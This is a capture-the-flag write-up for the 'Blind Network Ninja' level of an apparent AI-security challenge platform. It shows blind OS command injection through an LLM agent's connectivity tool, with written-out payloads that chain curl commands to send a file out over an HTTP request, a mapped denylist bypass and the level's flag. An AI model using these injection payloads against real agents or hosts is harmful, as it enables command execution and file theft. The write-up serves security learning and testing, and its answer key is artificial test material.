---
title: "Arkx — Blind Network Ninja"
platform: "Arkx"
track: "Advanced"
level: "Level 9"
vuln: "Blind OS command injection with out-of-band exfiltration"
severity: "Critical"
flag: "flag-b2eea8"
owasp: ["LLM05 Improper Output Handling", "LLM06 Excessive Agency"]
atlas: ["AML.T0053 LLM Plugin Compromise", "AML.T0024 Exfiltration"]
image: "/arkx/l9-blind-network-ninja.jpg"
order: 3
date: 2026-11-13
tags: ["ai", "llm", "command-injection", "oob", "exfiltration"]
summary: "A connectivity tool drops host straight into a shell and only says Online/Offline — so read the flag out-of-band through the server's own access logs."
draft: false
---

## Result

The agent has a `check_connectivity(host)` tool that interpolates `host` into a shell command **unsanitized**, and returns only *Online* / *Offline*. Classic blind OS command injection — and the level's local HTTP access log (readable at `/level/9/logs`) is a perfect out-of-band channel.

**Flag:** `flag-b2eea8`

## Exploit

**1 — Confirm execution + an OOB channel:**

```text
host = 127.0.0.1; curl http://127.0.0.1/inboundtest123
```

The log shows `GET /inboundtest123` — the injected command ran, and the logs give us a read-back channel the blind tool won't.

**2 — Map the denylist.** The shell metacharacters `$`, `|`, backtick and `>` are blocked (the tool returns *Offline*, nothing runs) — so no command or variable substitution. Allowed: `;  -  /  @  .  :`, space and alphanumerics.

**3 — Exfiltrate without substitution.** curl can read a file into the query string itself — no shell expansion needed:

```text
127.0.0.1; curl -G http://127.0.0.1/f --data-urlencode x@flag.txt
```

(validated first on `/etc/hostname`). The log query string then contains:

```text
x=flag-b2eea8
```

## Root cause

`host` reaches a shell with no sanitization (CWE-78). The metacharacter denylist is incomplete — it misses `;`, `-G`, `@`, `--data-urlencode` — and, crucially, a *blind* boolean-only tool still leaks arbitrary data over an out-of-band HTTP channel.

## Impact

Arbitrary command execution on the tool host plus exfiltration of any readable file, despite the tool only ever answering Online/Offline. Blindness is not a mitigation.
